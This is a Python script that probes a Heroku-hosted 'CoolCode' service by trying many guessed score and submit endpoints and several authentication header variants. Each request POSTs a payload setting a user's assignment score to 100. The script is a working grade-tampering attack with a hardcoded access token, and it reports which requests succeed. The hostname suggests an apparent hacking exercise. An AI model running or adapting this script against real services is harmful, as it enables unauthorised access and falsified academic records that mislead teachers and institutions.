#!/usr/bin/env python3
"""
CoolCode API Endpoint Explorer
Try different variations of the score API endpoint
"""

import requests
import json

def test_api_variations():
    """Test different API endpoint variations with your token"""
    
    print("🔍 CoolCode API Endpoint Explorer 🔍")
    print("=" * 50)
    
    access_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
    username = "CX8de3ce71-3cbTY"
    base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
    
    # Different endpoint variations to try
    endpoints = [
        "/api/api/assignment/score",
        "/api/assignment/score", 
        "/api/score",
        "/api/assignments/score",
        "/api/api/score",
        "/api/api/assignment/grade",
        "/api/grade",
        "/api/submit",
        "/api/api/submit",
        "/api/assignment/submit",
        "/api/student/score",
        "/api/api/student/score"
    ]
    
    # Different header combinations to try
    header_combinations = [
        {"Content-Type": "application/json", "Authorization": f"Bearer {access_token}"},
        {"Content-Type": "application/json", "ACCESS_TOKEN": access_token},
        {"Content-Type": "application/json", "X-Access-Token": access_token},
        {"Content-Type": "application/json", "Token": access_token},
        {"Content-Type": "application/json"},  # No auth
        {"Content-Type": "application/x-www-form-urlencoded", "Authorization": f"Bearer {access_token}"},
    ]
    
    payload = {
        "username": username,
        "assignmentId": 1,
        "score": 100
    }
    
    print(f"Testing with username: {username}")
    print(f"Testing with token: {access_token[:30]}...")
    print("=" * 50)
    
    successful_combinations = []
    
    for endpoint in endpoints:
        url = base_url + endpoint
        print(f"\n🔍 Testing endpoint: {endpoint}")
        
        for i, headers in enumerate(header_combinations, 1):
            try:
                # Adjust payload format based on content type
                if headers.get("Content-Type") == "application/x-www-form-urlencoded":
                    data = f"username={username}&assignmentId=1&score=100"
                    response = requests.post(url, data=data, headers=headers, timeout=5)
                else:
                    response = requests.post(url, json=payload, headers=headers, timeout=5)
                
                status = response.status_code
                response_text = response.text[:100] + "..." if len(response.text) > 100 else response.text
                
                header_desc = f"Header {i}: " + (
                    "Bearer Token" if "Bearer" in str(headers) else
                    "ACCESS_TOKEN" if "ACCESS_TOKEN" in headers else
                    "X-Access-Token" if "X-Access-Token" in headers else
                    "Token" if "Token" in headers else
                    "No Auth"
                )
                
                print(f"  {header_desc:<20} | {status} | {response_text}")
                
                if status == 200:
                    print(f"  🎉 SUCCESS! Found working combination!")
                    successful_combinations.append({
                        'endpoint': endpoint,
                        'headers': headers,
                        'status': status
                    })
                elif status not in [404, 500, 403]:
                    print(f"  ⚠️ Interesting response: {status}")
                    
            except Exception as e:
                print(f"  💥 Error: {str(e)[:50]}")
    
    print("\n" + "=" * 50)
    print("📊 RESULTS SUMMARY")
    print("=" * 50)
    
    if successful_combinations:
        print(f"✅ Found {len(successful_combinations)} working combination(s)!")
        for combo in successful_combinations:
            print(f"   🎯 {combo['endpoint']} with {list(combo['headers'].keys())}")
    else:
        print("❌ No working combinations found")
        print("\n💡 Next steps:")
        print("1. Check browser Network tab for legitimate requests")
        print("2. Look for the exact headers used in real submissions")
        print("3. The API might require different authentication method")
        print("4. Try examining form submissions or other user actions")

if __name__ == "__main__":
    test_api_variations()
